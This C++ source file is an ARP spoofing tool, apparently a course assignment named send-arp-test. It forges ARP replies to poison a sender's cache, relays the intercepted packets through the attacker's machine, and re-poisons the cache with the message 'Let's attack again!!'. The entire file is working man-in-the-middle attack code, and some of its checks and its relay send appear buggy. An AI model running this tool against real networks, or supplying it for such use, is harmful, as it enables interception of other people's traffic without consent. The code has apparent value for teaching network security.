#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "plus.h"
#include <thread>

using std::thread;



void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

Ip getIPAddress (char* dev){
    int sock;
    struct ifreq ifr;
    uint32_t myip;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy((char*)ifr.ifr_name, dev, IFNAMSIZ -1);
    ioctl(sock, SIOCGIFADDR, &ifr);
    close(sock);
    myip = ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr);

    return myip;
}

Mac getMacAddress (char* dev){
    int sock;
    struct ifreq ifr;
    Mac mymac;

    sock = socket(AF_INET,SOCK_DGRAM,0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy((char*)ifr.ifr_name, (const char*)dev, IFNAMSIZ-2);
    ioctl(sock,SIOCGIFHWADDR,&ifr);
    close(sock);
    mymac = (uint8_t*)ifr.ifr_hwaddr.sa_data;
    return mymac;
}

void send_packet(pcap_t* handle, Mac eth_dmac, Mac eth_smac, uint16_t op, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip ){
    EthArpPacket packet;
    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.smac_ = eth_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = op;
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = arp_sip;
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.tip_ = arp_tip;

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

}

void receive_packet(pcap_t* handle, Mac& mac, Ip ip){
    while (true) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }

            struct EthArpPacket* etharp = (EthArpPacket*) packet;

            if (ntohs(etharp->eth_.type_) == EthHdr::Arp && ntohs(etharp -> arp_.op_) == ArpHdr::Reply && etharp->arp_.sip() == ip){
                mac = etharp->arp_.smac();
                printf("receive_packet_smac: %s\n",std::string(mac).c_str());
                break;
            }
            else if(ntohs(etharp->eth_.type_) == EthHdr::Arp && ntohs(etharp -> arp_.op_) == ArpHdr::Reply && etharp->arp_.tip() == ip){
                mac = etharp->arp_.tmac();
                printf("receive_packet_tmac: %s\n",std::string(mac).c_str());
                break;
            }
            else{
                printf("wrong packet\n");
                printf("mac: %s\n",std::string(mac).c_str());
                printf("Ip(myip) : %s\n\n",std::string(etharp->arp_.sip()).c_str());
            }
    }
}

void check_infected(pcap_t* handle, Mac smac, Ip sip, Mac tmac, Ip tip, Mac attacker_mac){
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        struct EthIpPacket* ethip = (EthIpPacket*) packet;
        struct EthArpPacket* etharp = (EthArpPacket*) packet;

        if (etharp->eth_.type() != EthHdr::Arp && etharp->eth_.smac()!= smac && etharp->arp_.tip() == tip){
            printf("the packet is recovered. Let's attack again!!\n");
            send_packet(handle, smac, attacker_mac, htons(ArpHdr::Reply),attacker_mac, htonl(tip), smac, htonl(sip));
        }else if(ethip->eth_.type() != EthHdr::Ip4 && ethip->eth_.smac()!=smac && ethip->ip_.ip_dst!=tip){
            printf("catch sender's packet well. let's relay!\n");
            ethip->eth_.smac_ = attacker_mac;
            ethip->eth_.dmac_ = tmac;
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthIpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
    }
}
void working(char* dev, Flow& flow){

    Ip sip = flow.sip;
    Ip tip = flow.tip;
    Ip attacker_ip = flow.aip;
    Mac smac = flow.smac;
    Mac tmac = flow.tmac;
    Mac attacker_mac = flow.amac;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
    }

    //get smac
    send_packet(handle, Mac::broadcastMac(), attacker_mac, htons(ArpHdr::Request),attacker_mac, htonl(attacker_ip), Mac::nullMac(), htonl(sip));
    receive_packet(handle,smac,sip);

    //get tmac
    send_packet(handle, Mac::broadcastMac(), attacker_mac, htons(ArpHdr::Request),attacker_mac, htonl(attacker_ip), Mac::nullMac(), htonl(tip));
    receive_packet(handle,tmac,tip);

    printf("smac: %s\n",std::string(smac).c_str());
    printf("tmac: %s\n",std::string(tmac).c_str());

    //send arp spoof packet
    send_packet(handle, smac, attacker_mac, htons(ArpHdr::Reply),attacker_mac, htonl(tip), smac, htonl(sip));

    //check infected and normal packet
    check_infected(handle, smac, sip, tmac, tip, attacker_mac);

    pcap_close(handle);

}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }

	char* dev = argv[1];

    Ip attacker_ip = getIPAddress(dev);
    Mac attacker_mac = getMacAddress(dev);

    int cnt = argc-2;
    thread workers[cnt/2];
    struct Flow flow[cnt/2];
    int work=0;

    for(int i =2;cnt>0;i=i+2,cnt=cnt-2){

        Ip sip = Ip(argv[i]); //sender
        Ip tip = Ip(argv[i+1]); //target
        Mac smac;
        Mac tmac;

        flow[work].sip = sip;
        flow[work].smac = smac;
        flow[work].tip = tip;
        flow[work].tmac = tmac;
        flow[work].aip = attacker_ip;
        flow[work].amac = attacker_mac;

        workers[work] = thread(working,dev,std::ref(flow[work]));
        work+=1;
    }

    for (int i=0;i<work;i++){
        workers[i].join();
    }

    return 0;
}
